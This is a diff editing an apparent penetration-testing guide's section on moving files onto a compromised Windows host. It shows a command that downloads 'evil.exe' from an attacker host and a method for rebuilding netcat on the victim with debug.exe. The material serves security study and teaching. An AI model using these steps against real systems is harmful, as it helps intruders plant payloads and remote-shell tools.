@@ -376,21 +376,17 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 
 ## Debug.exe
 
-This is a crazy technique that works on Windows 32 bit machines. The idea is to use the `debug.exe` program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take binaries, like `netcat`. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with `debug.exe`.
+The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.
 
-`Debug.exe` can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that:
-
-```
+```bash
+# Reduce the size
 upx -9 nc.exe
-```
-
-Now it only weighs 29 kb. Perfect. So now let's disassemble it:
-
-```
 wine exe2bat.exe nc.exe nc.txt
 ```
 
-Now we just copy-paste the text into our windows-shell. And it will automatically create a file called nc.exe
+Then copy-paste the text into the windows-shell and a file called nc.exe will be created.
+
+* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
